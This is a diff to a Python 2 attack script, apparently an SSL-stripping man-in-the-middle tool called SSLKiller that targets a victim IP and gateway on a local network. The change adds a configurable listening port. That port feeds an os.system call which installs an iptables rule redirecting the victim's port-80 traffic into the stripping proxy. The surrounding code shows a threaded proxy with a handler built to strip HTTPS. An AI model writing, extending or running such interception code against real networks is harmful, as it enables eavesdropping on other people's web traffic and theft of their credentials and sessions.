@@ -19,7 +19,7 @@
 # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 # USA
 
-version = 1.1
+version = 1.2
 banner = """\n
 
   ██████   ██████  ██▓        ██ ▄█▀ ██▓ ██▓     ██▓
@@ -40,6 +40,7 @@ help = """\nusage:
  Network interface:     -i <INTERFACE> or --interface <INTERFACE>
  Target IP Address:     -t <TARGET> or --target <TARGET>
  Gateway IP Address:    -g <GATEWAY> or --gateway <GATEWAY> 
+ Listening Port:	-l <PORT> or --listen <PORT>
  Debug mode:            -d Turn debugger ON, default = OFF
 
 example:
@@ -77,6 +78,7 @@ from subprocess import Popen, PIPE
 from HTMLParser import HTMLParser
 
 debug = False
+port = 8080
 
 class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
     address_family = socket.AF_INET6
@@ -293,7 +295,6 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
 
 
 def Proxy(HandlerClass=ProxyRequestHandler, ServerClass=ThreadingHTTPServer, protocol="HTTP/1.1"):
-    port = 8080
     server_address = ('', port)
 
     HandlerClass.protocol_version = protocol
@@ -549,8 +550,11 @@ if __name__ == "__main__":
 			if x == "-g" or x == "--gateway":
 				index = sys.argv.index(x) + 1
 				gateway = sys.argv[index]
+			if x == "-l" or x == "--listen":
+				index = sys.argv.index(x) + 1
+				port = int(sys.argv[index])
 		sslkill = SSLKiller(interface, target, gateway)
-		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
+		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports {}".format(port))
 		Proxy(HandlerClass=SSLStripRequestHandler)
 	except KeyboardInterrupt:
 		print "[!] Aborted..."
